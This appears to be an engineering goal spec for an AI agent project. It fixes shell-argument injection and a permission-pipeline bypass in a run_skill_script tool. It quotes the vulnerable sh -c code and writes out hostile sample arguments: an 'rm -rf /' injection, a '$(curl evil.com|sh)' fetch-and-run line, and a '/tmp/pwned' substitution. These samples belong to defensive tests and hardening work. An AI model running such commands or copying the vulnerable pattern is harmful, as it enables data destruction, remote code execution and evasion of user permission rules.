# Goal 283 — run_skill_script shell-words + permission pipeline

**Roadmap**: Phase 17 (Production Hardening) — P1 from
`docs/review/architecture-review-2026-06-15.md` (NEW-TOOL-16),
also referenced in 06-10 NEW-SKILL-2 + drift of SEC-002.

**Design principle check**:
- Implemented as: (a) parse skill script args with a shell-aware
  tokenizer; (b) route the dispatch through the same permission
  pipeline every other tool uses (with a default-deny for
  unregistered skills).
- ❌ Does NOT branch inside `agent.rs::Agent::run`'s main loop
- ❌ Does NOT add a new feature flag

## Why

`src/tools/run_skill_script.rs:134-147`:

```rust
let args_str = arguments["args"].as_str().unwrap_or("");
let shell_command = if args_str.is_empty() {
    script.path.to_string_lossy().to_string()
} else {
    format!("{} {}", script.path.display(), args_str)
};

let mut cmd = Command::new("/bin/sh");
cmd.arg("-c").arg(&shell_command).current_dir(&self.workspace)
   .stdout(Stdio::piped()).stderr(Stdio::piped());
```

Two security problems compound:

1. **Args injection**: `args_str` is concatenated into a
   `sh -c` string. A skill that receives `args: '"; rm -rf /; echo'`
   from the LLM gets the LLM's text executed as shell. Even
   with trusted skills, an LLM that hallucinates
   `args: "$(curl evil.com|sh)"` triggers RCE.

2. **Pipeline bypass**: `run_skill_script` calls
   `child.spawn()` directly, bypassing
   `ToolRegistry::invoke_with_audit` → `PermissionPipeline::check`.
   A skill that runs `Bash`-equivalent commands does NOT hit
   the user's allow/deny rules. Skill trust + `sh -c` = policy
   bypass.

Both 06-10 review (NEW-SKILL-2) and 06-15 review (NEW-TOOL-16)
flagged this. Both drifted.

The fix has two halves:
- Parse args with `shell-words` so args are passed as argv
  elements, not concatenated into a shell string
- Wire the tool into the standard dispatch pipeline so the
  user's permission rules apply

## Scope (do exactly this, no more)

### 1. Add `shell-words` dependency

In `Cargo.toml`, add:

```toml
shell-words = "1"
```

Justification: a single-purpose, dependency-free crate (no
transitive deps) for splitting shell-style argument strings.
Used by every major shell tool (clap, ripgrep, fd) for the
same purpose. No alternative in std.

State the reason in the journal entry per invariant 6 (no new
deps without justification).

### 2. Parse args with shell-words

In `src/tools/run_skill_script.rs`, replace the args handling:

```rust
let args_raw = arguments["args"].as_str().unwrap_or("");
let args_vec: Vec<String> = if args_raw.is_empty() {
    Vec::new()
} else {
    shell_words::split(args_raw).map_err(|e| Error::Tool {
        name: "run_skill_script".into(),
        message: format!("failed to parse args: {e}"),
    })?
};

let mut cmd = Command::new(&script.path);
cmd.args(&args_vec)
   .current_dir(&self.workspace)
   .stdout(Stdio::piped())
   .stderr(Stdio::piped());
```

The script is now invoked directly (no `sh -c`). The script's
own shebang (`#!/bin/bash`, `#!/usr/bin/env python3`, etc.)
determines the interpreter. Args are passed as discrete argv
elements — no shell expansion, no injection.

Note: `script.path` must be executable (`chmod +x`). If the
file lacks a shebang, OS will fail to exec it — that's a
reasonable failure mode (the user gets an error).

### 3. Route through the permission pipeline

Currently `run_skill_script::execute` is called directly via
the tool's `impl Tool for RunSkillScript { fn execute() ... }`
path. The `ToolRegistry::invoke_with_audit` method already
routes through the pipeline. Verify by reading
`src/tools/mod.rs::invoke_with_audit` (around line 824) and
the dispatch flow.

The fix: ensure `RunSkillScript::execute` does NOT short-
circuit the permission check. Read the existing pipeline —
it should already cover all tools registered in the registry.
If the current implementation bypasses the registry entirely
(e.g. `RunSkillScript::execute` is called from somewhere other
than `ToolRegistry::dispatch_after_permission_check`), refactor
so all paths go through the registry.

### 4. Add an explicit safety check

If the skill name contains path-traversal characters (`..` or
absolute path prefixes), the tool must reject before exec.
`canonical_script.starts_with(&canonical_skill_dir)` at line 127
already does this — keep it.

### 5. Tests

In `src/tools/run_skill_script.rs` `mod tests`:

```rust
#[tokio::test]
async fn args_with_shell_metachars_are_passed_verbatim() {
    // args = '"; rm -rf /"' should be passed to the script as a
    // single argv element, NOT executed as shell.
    // Build a script that prints its argv, run with the malicious
    // args, assert the script saw the literal string and
    // /tmp was not touched (set up a sentinel file).
}

#[tokio::test]
async fn args_with_command_substitution_are_passed_verbatim() {
    // args = '$(touch /tmp/pwned)' — same as above.
}

#[tokio::test]
async fn run_skill_script_respects_permission_pipeline() {
    // Set up a ToolRegistry with a Deny rule for "run_skill_script".
    // Call the tool. Assert it returns Error::PermissionDenied.
    // (Per Goal 273's permission_pipeline refactor, this should
    // already work; this test pins that it does.)
}

#[tokio::test]
async fn run_skill_script_falls_back_to_command_not_found_on_bad_script() {
    // script.path has no shebang, OS fails to exec. Assert the
    // tool returns an Error::Tool with a clear message (not a
    // silent success).
}
```

## Acceptance

- `cargo test --workspace` — green (existing + 4 new tests)
- `cargo clippy --all-targets --all-features -- -D warnings` —
  clean
- `cargo fmt --all` — applied
- `grep "sh -c" src/tools/run_skill_script.rs` — 0 matches
- `grep "shell_words" src/tools/run_skill_script.rs` — ≥ 3
  matches: use, error path, test
- `grep "shell-words" Cargo.toml` — 1 match (new dep)
- `cargo tree --package recursive-agent` — `shell-words` appears
  with no transitive deps beyond stdlib

## Notes for the agent

- This goal deliberately changes the *runtime semantics* of
  `run_skill_script`. Skills that depend on `sh -c` globbing
  (e.g. `args: "*"` to mean "all files in cwd") will silently
  see literal `*` instead. Document this in CHANGELOG. The
  mitigation: skill authors update their scripts to expand globs
  themselves (`args.iter().filter_map(|a| glob(a))`), which is
  the safer pattern.
- The `canonical_script.starts_with(&canonical_skill_dir)` check
  at line 127 is load-bearing — DO NOT weaken it. If the goal
  adds more path checks, add them as additional layers, not
  replacements.
- Estimated diff: 2 files (run_skill_script.rs, Cargo.toml),
  ~50 lines net.
- **Test discipline reminder (from g268 post-mortem)**: tests
  must use real `Command::spawn` for the malicious-args tests
  to be meaningful. A pure-string assertion on the parsed argv
  is fine for the unit test, but the integration test (the
  sentinel-file one) must actually exec the script.

**Disjoint file guarantee**: This goal touches
src/tools/run_skill_script.rs and Cargo.toml. Goal 281 touches
src/hooks/external.rs. No overlap — safe to run in parallel.